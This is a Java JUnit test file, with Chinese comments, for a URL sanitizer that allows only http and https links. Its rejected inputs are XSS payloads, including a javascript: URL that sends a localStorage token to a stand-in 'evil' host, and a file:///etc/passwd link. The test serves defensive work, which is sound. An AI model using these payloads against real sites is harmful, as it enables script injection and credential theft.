package com.example.interview.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * 外链协议白名单测试（P1-04）。
 *
 * <p>覆盖攻击面：大小写变体、前导空白、协议相对、data/blob 伪协议、控制字符注入。
 */
@DisplayName("外链协议白名单测试")
class UrlSafetyTest {

    @ParameterizedTest
    @DisplayName("javascript: 及其变体一律拒绝")
    @ValueSource(strings = {
            "javascript:alert(1)",
            "JavaScript:alert(1)",
            "  javascript:alert(1)",
            "java\nscript:alert(1)",
            " javascript:fetch('//evil/'+localStorage.token)",
            "jav&#x09;ascript:alert(1)",
    })
    void rejectsJavascriptScheme(String url) {
        assertThat(UrlSafety.sanitize(url)).isNull();
        assertThat(UrlSafety.isSafeWebUrl(url)).isFalse();
    }

    @ParameterizedTest
    @DisplayName("data / blob / vbscript / file 等非 http(s) 协议拒绝")
    @ValueSource(strings = {
            "data:text/html,<script>alert(1)</script>",
            "blob:https://example.com/uuid",
            "vbscript:msgbox(1)",
            "file:///etc/passwd",
            "ftp://example.com/a",
    })
    void rejectsNonWebSchemes(String url) {
        assertThat(UrlSafety.sanitize(url)).isNull();
    }

    @ParameterizedTest
    @DisplayName("协议相对与无 host 的链接拒绝")
    @ValueSource(strings = {
            "//evil.com/path",
            "https://",
            "https:///path",
            "http://",
    })
    void rejectsRelativeOrHostless(String url) {
        assertThat(UrlSafety.sanitize(url)).isNull();
    }

    @Test
    @DisplayName("正常 http/https 链接放行，并去掉首尾空白")
    void acceptsWebUrls() {
        assertThat(UrlSafety.sanitize("https://careers.example.com/jobs/1"))
                .isEqualTo("https://careers.example.com/jobs/1");
        assertThat(UrlSafety.sanitize("  http://example.com/a?b=1  "))
                .isEqualTo("http://example.com/a?b=1");
        assertThat(UrlSafety.sanitize("HTTPS://Example.com/Path")).isEqualTo("HTTPS://Example.com/Path");
    }

    @Test
    @DisplayName("空白与超长链接按「无链接」处理")
    void rejectsBlankAndOverlong() {
        assertThat(UrlSafety.sanitize(null)).isNull();
        assertThat(UrlSafety.sanitize("   ")).isNull();
        assertThat(UrlSafety.sanitize("https://example.com/" + "a".repeat(600))).isNull();
    }
}
